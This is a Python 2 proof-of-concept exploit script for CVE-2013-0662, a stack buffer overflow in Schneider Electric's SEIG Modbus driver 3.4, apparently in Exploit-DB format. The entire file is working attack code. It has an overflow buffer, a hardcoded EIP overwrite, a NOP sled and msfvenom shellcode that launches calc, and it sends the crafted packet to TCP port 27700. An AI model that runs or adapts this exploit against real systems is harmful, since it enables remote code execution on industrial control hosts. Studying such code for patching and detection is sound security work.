# Title: SEIG Modbus 3.4 - Remote Code Execution
# Author: Alejandro Parodi
# Date: 2018-08-17
# Vendor Homepage: https://www.schneider-electric.com
# Software Link: https://github.com/hdbreaker/Ricnar-Exploit-Solutions/tree/master/Medium/CVE-2013-0662-SEIG-Modbus-Driver-v3.34/VERSION%203.4
# Version: v3.4
# Tested on: Windows XP SP3
# CVE: CVE-2013-0662
# References: 
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0662

import socket
import struct

ip = "192.168.127.138"
port = 27700
con = (ip, port)


####### MESSAGE ##########
message_header = "\x00\x64"
message_buffer = "A" * 0x5dc
eip = struct.pack("<I", 0x7C9C167D)

# Shellcode generated with:
# msfvenom -a x86 --platform windows -p windows/exec cmd=calc -e x86/xor_call4 -f python
# Shellcode Size: 189 bytes
nopsleed = "\x90" * 100 # \x90 bad char bypass
shellcode  = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shellcode += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shellcode += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shellcode += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shellcode += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shellcode += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shellcode += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shellcode += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shellcode += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shellcode += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
shellcode += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shellcode += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
shellcode += "\xff\xd5\x63\x61\x6c\x63\x00"

message = message_header + message_buffer + eip + nopsleed + shellcode
print "Message Len: " + hex(len(message)) + " bytes"
##########################

######## PKG HEADER ######
header_padding = "\x42\x42"
header_buf_size = "\xFF\xFF"
header_recv_len = struct.pack(">H", len(message))
header_end = "\x44"

header = header_padding + header_buf_size + header_recv_len + header_end
##########################

######## CRAFTING PAYLOAD ########
payload = header + message
print "Package Len: "+hex(len(payload)) + " bytes"
##################################

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(con)
s.send(payload)